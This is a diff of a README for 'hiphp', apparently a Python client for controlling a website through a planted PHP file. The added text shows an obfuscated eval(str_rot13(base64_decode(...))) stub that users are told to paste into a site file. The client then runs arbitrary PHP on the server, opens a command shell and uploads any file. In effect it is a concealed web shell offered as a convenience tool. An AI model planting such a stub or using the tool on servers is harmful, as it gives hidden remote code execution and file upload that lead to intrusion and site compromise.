@@ -14,7 +14,7 @@
 <h2>Installation:</h2>
 
 ```
-pip install hiphp==0.1.5
+pip install hiphp==0.1.6
 ```
 
 <h2>Usage:</h2>
@@ -22,10 +22,16 @@ pip install hiphp==0.1.5
 ```python
 # USAGE :
 #s
-#s
 from hiphp import hiphp
 
-hiphp("<PASSWORD>","http://LINK/TO/YOUR/PHP/FILE",<OPTIONS>).run()
+p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>")
+print(p1.get_code())//Get HIPHP ID for first use.
+p1.run("<YOUR_CODE>")//Run a code or line in your website.
+p1.run_file("<PHP_CODE_FILE_PATH>")//Run a code or line in your website from a file.
+p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>")//Run a code or line in your website from a file With the entry of variables.
+p1.cli()//open command panel
+p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>")//Upload a file to the server hosting the site.
+p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>")
 #e
 
 ```
@@ -37,35 +43,80 @@ hiphp("<PASSWORD>","http://LINK/TO/YOUR/PHP/FILE",<OPTIONS>).run()
 #s
 from hiphp import hiphp
 
+hiphp("123","https://localhost/index.php")
+
 # Example:1
-# CLI:
-hiphp("123","https://localhost/index.php").run()
+# GET ID:
+print(p1.get_code())
+# OUTPUT:
+'''
+/*php code start*/
+eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdUhJU09zSUlBU0h5OU9FMElCSVBxcUNHMGFaUUx3QlJEM0F3RDBBUlJsWndSbEIwRGtDR1pqWUd0MFdHRDVDbU4xQ1JaakpteDFybVNPWFFOMkJ3SVBuR1Zsb0hObFpRTzBEbU9uQkdEY1p3dTlEMFdxQkdEK0FtTnVEeFp4QXdOekR3RXNBbU5lQUhWa0VRTG1abVYxRHdwM1pSTDVXbHk3TUpBYm9scHdwVXkwblQ5aFdtZ2NNdnVjcDNBeXFQdHhLMU9DSDFFb1cyQWlvSjF1b3pEYUtGeGNyMkkyTEpqYldTOURHMUFISmxxd28yMWdMSjV4VzEwY0IzMXlyVHkwQjMwPQ==')))));
+/*php code end*/
+'''
+# Copy this code into the file whose path you entered earlier.
+# for example: https://localhost/index.php
+
 
 # Example:2
 # Command:
-hiphp("123","https://localhost/index.php",False,False).run("-c echo 'hi';")
+p1.run("echo 'this is a test';")
+# OUTPUT:
+'''
+this is a test
+'''
 
 # Example:3
-# Command:
-p1=hiphp("123","https://localhost/index.php",True,False).run("-c echo 'hi';")
-print(p1)
+# Run code from file:
+#-example_3.php content:
+'''
+echo 'this is a test';
+'''
+#OR
+'''
+<?php
+    echo 'this is a test';
+?>
+'''
+p1.run_file("example_3.php")
+# OUTPUT:
+'''
+this is a test
+'''
 
 # Example:4
+# Run code from file With the entry of variables:
 #-example_4.php content:
-'''<?php
-    $fp=fopen("test.txt","w+");
-    Fwrite($fp,"this is a test");//Writing inside the file
-?>'''
-# File:
-hiphp("123","https://localhost/index.php",False,False).run("example_4.php")
+'''
+echo '__test__';
+'''
+#OR
+'''
+<?php
+    echo '__test__';
+?>
+'''
+p1.run_file("example_4.php","test==this is a test")
+# OUTPUT:
+'''
+this is a test
+'''
 
 # Example:5
-#-example_5.txt content:
-'''// prints something like: Wednesday the 15th
-    echo date('l \t\h\e jS');'''
-# File:
-p1=hiphp("123","https://localhost/index.php",True,False).run("example_5.txt")
-print(p1)
+# Command line interface:
+p1.cli()
+# OUTPUT:
+'''
+hiphp>>>
+'''
+
+# Example:6
+# Upload a picture:
+p1.upload("picture_example.png")
+
+# Example:7
+# Upload a picture to a specific path:
+p1.upload("picture_example.png","./pictures/")
 #e
 
 ```
@@ -73,6 +124,11 @@ print(p1)
 <h2>Changelog:</h2>
 
 ```
+## 0.1.6
+ - fix bugs.
+ - add upload to upload any file.
+ - Simplify the use of the program.
+
 ## 0.1.5
  - fix bugs.
 
